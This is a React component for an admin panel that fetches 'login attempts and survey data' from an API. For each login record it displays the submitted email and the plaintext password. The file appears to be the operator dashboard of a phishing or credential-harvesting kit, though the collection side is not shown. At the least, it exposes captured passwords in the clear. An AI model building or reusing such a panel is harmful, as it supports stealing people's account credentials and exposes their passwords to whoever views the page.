import React, { useState, useEffect } from 'react';

function AdminPanel({ onLogout }) {
    const [data, setData] = useState([]);

    useEffect(() => {
        const fetchData = async () => {
            try {
                const response = await fetch('/api/data');
                if (response.ok) {
                    const jsonData = await response.json();
                    setData(jsonData);
                } else {
                    console.error('Failed to fetch data');
                }
            } catch (error) {
                console.error('Error fetching data:', error);
            }
        };
        fetchData();
    }, []);

    return (
        <div className="admin-panel">
            <h2>Login Attempts and Survey Data</h2>
            <button onClick={onLogout}>Logout</button>
            <ul>
                {data.map((item, index) => (
                    <li key={index}>
                        {item.type === 'login' && (
                            <>
                                <p><strong>Type:</strong> Login</p>
                                <p><strong>Email:</strong> {item.email}</p>
                                <p><strong>Password:</strong> {item.password}</p>
                            </>
                        )}
                        {item.type === 'survey' && (
                            <>
                                <p><strong>Type:</strong> Survey</p>
                                <p><strong>Survey ID:</strong> {item.surveyId}</p>
                                <p><strong>Answers:</strong> {JSON.stringify(item.answers)}</p>
                            </>
                        )}
                    </li>
                ))}
            </ul>
        </div>
    );
}

export default AdminPanel;
